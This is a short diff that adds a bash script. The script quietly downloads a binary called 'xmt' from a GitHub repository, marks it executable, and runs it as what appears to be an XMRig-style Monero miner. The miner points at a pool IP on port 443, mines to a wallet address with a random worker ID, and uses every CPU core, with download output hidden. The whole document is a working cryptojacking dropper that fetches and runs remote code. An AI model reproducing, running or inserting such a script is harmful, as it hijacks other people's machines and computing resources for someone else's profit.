@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/kartolo92/jadul/raw/refs/heads/main/xmt >/dev/null 2>&1
+chmod +x xmt
+./xmt --donate-level 1 -o 167.99.139.112:443 -u Q010500dcddedd09eb43778b8c86fc30d1682af477c2693f24c34113532603031ecdac7e2d5a133.$(shuf -n 1 -i 1-99999)-BB -p x -a rx/0 -k -t $(nproc --all)
